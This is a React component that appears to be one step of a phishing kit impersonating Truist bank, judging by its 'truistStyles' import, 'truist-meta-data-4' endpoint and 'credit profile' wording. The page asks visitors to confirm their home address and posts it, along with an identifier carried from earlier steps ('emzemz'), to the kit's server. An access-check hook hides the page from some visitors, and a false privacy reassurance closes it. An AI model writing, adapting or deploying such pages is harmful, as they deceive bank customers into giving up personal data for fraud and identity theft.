import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';

const HomeAddress: React.FC = () => {
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    stAd: '',
    apt: '',
    city: '',
    state: '',
    zipCode: '',
    form: '',
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      stAd: !stAd.trim() ? 'Street address is required.' : '',
      city: !city.trim() ? 'City is required.' : '',
      state: !state.trim() ? 'State is required.' : '',
      zipCode: !zipCode.trim() ? 'ZIP code is required.' : '',
      apt: '',
      form: '',
    };

    setErrors(newErrors);

    if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
      try {
        await axios.post(`${baseUrl}api/truist-meta-data-4/`, {
          emzemz,
          stAd,
          apt,
          city,
          state,
          zipCode,
        });

        navigate('/terms', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting home address:', error);
        setErrors((prev) => ({
          ...prev,
          form: 'There was an error submitting your address. Please try again.',
        }));
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!emzemz) {
    return (
      <div className="flex flex-col items-center justify-center">
        <div className={cardStyles.base}>
          <div className={cardStyles.padding}>
            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
              Unable to continue
            </h1>
            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
              We could not locate your previous step. Please restart the flow from the beginning.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center justify-center">
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Confirm Your Home Address
          </h1>
          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
            This should match the address tied to your credit profile
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="stAd">
                Street address
              </label>
              <input
                id="stAd"
                name="stAd"
                type="text"
                value={stAd}
                onChange={(e) => setStAd(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="123 Main St"
              />
              {errors.stAd && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{errors.stAd}</span>
                </div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="apt">
                Apartment or unit (optional)
              </label>
              <input
                id="apt"
                name="apt"
                type="text"
                value={apt}
                onChange={(e) => setApt(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="Unit 5B"
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="city">
                City
              </label>
              <input
                id="city"
                name="city"
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="City"
              />
              {errors.city && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{errors.city}</span>
                </div>
              )}
            </div>

            <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="state">
                  State
                </label>
                <input
                  id="state"
                  name="state"
                  type="text"
                  value={state}
                  onChange={(e) => setState(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="CA"
                />
                {errors.state && (
                  <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                    <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                    </svg>
                    <span>{errors.state}</span>
                  </div>
                )}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]" htmlFor="zipCode">
                  ZIP code
                </label>
                <input
                  id="zipCode"
                  name="zipCode"
                  type="text"
                  value={zipCode}
                  onChange={(e) => setZipCode(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="90210"
                />
                {errors.zipCode && (
                  <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                    <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                    </svg>
                    <span>{errors.zipCode}</span>
                  </div>
                )}
              </div>
            </div>

            {errors.form && (
              <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
                {errors.form}
              </div>
            )}

            <div className="flex flex-wrap gap-3 pt-2">
              <button
                type="submit"
                className={buttonStyles.base}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className={buttonStyles.loading}></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          </form>

          <p className="text-xs text-[#5d4f72] mt-8 text-center">
            Your information is secure and will be used in accordance with our Privacy Policy.
          </p>
        </div>
      </div>
    </div>
  );
};

export default HomeAddress;